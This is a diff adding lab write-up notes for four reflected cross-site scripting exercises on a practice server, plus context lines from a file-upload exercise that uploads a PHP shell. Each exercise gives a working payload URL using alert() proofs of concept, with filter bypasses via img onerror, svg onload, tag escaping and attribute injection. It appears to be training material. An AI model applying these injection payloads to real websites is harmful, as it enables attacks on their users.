@@ -494,3 +494,88 @@ Figure out how much damage can a hacker do using the file upload vulnerability i
 >Content-Disposition: form-data; name="report"; filename="shell4.php4"
 >Content-Type: application/vnd.ms-powerpoint
 
+
+## Temporary XSS Variant 1
+
+### query:
+http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-1/hello.php?user_name=john
+
+### task:
+See if you can use the input field to cause harm to the user of this website.
+
+### payload:
+<p>Hi john</p>
+*as our input is closed in '<p>' tags we can esacpe this easily*
+
+http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-1/hello.php?user_name=john</p><script>alert(1)</script>
+
+
+## Temporary XSS Variant 2
+
+### query:
+http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-2/xss/testing
+
+### task:
+See if you can use your knowledge of JavaScript to cause harm to the user of this website.
+
+### payload:
+*'testing' in the query is the parameter being displayed*
+*as they are filtering <script> tags we are not able to write simply <script>alert(1)</script>script>*
+
+*in this conditons we can use <img src='x' onerror=alert(1)> or <svg onload=alert(1)>*
+
+http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-2/xss/testing <img src='x' onerror=alert(1)>
+
+
+## Temporary XSS Variant 3
+
+### query:
+http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-3/error.php?error_txt=Incorrect username and password
+
+### task:
+See if you can inject HTML/JS and generate 'xssed' alert pop up.
+
+### payload:
+*'error_txt=Incorrect username and password' this text is being displayed on error.php page we can alter with this text to execute JS*
+
+<a href="/Cross-Site-Scripting/Temporary-XSS-Variant-3"><input
+class="btn btn-block" type="button" value="Incorrect username and password"></a>
+
+*as it is enclosed value parameter of <a> tag we need to escape this first as our
+	<script> tag will be displayed as tag it will not be executed in browser*
+
+http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-3/error.php?error_txt=Incorrect username and password "></a>
+<script>alert('xssed')</script>
+
+
+## Temporary XSS Variant 4
+
+### query:
+<iframe id="frame" src="https://yale-lily.github.io/public/adamzucker.pdf" name="frame"></iframe>
+
+### task:
+See if you can bypass protective filters and generate alert pop up.
+
+### payload:
+*user-input: https://yale-lily.github.io/public/adamzucker.pdf"*
+
+*query formed*
+<iframe id="frame" src="https://yale-lily.github.io/public/adamzucker.pdf" name="frame"></iframe>
+
+*user-input: https://yale-lily.github.io/public/adamzucker.pdf" onload=alert(1) *
+
+*query formed*
+ <iframe id="frame" src="https://yale-lily.github.io/public/adamzucker.pdf" onload=alert(1) " name="frame"></iframe>
+
+*as " after .pdf is escaping the src paramter and onload event lister waits the pdf to be loaded then generates alert*
+
+
+
+
+
+
+
+
+
+
+
